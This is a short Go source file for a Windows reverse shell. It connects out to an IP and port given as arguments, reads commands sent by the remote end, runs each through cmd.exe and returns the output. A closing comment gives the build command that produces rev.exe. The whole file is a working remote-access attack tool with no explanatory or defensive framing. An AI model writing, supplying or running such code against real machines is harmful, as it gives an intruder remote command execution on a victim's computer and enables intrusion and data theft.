package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"os/exec"
	"strings"
)

func main() {
	if len(os.Args) < 3 {
		fmt.Println("Please provide the necessary args: ./<binary_name> <ip> <port>")
		os.Exit(-1)
	}

	address := fmt.Sprintf("%s:%s", os.Args[1], os.Args[2])
	conn, err := net.Dial("tcp", address)
	if err != nil {
		fmt.Println("FATAL could not establish connection with", address)
		os.Exit(-1)
	}

	reader := bufio.NewReader(conn)
	for {
		dir, _ := os.Getwd()
		fmt.Fprintf(conn, "%s >>> ", dir)
		command, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println("Could not read command from server", err)
			os.Exit(-1)
		}
		commands := []string{"/c"}
		commands = append(commands, strings.Split(command, " ")...)
		fmt.Println("exeucting", commands)
		cmd := exec.Command("cmd.exe", commands...)
		output, err := cmd.Output()
		fmt.Println(string(output))
		if err != nil {
			fmt.Println(err)
			continue
		}
		fmt.Fprintf(conn, "%s \n%s >>>", string(output), dir)
	}
}


// Build GOOS=windows GOARCH=386 go build -o rev.exe main.go
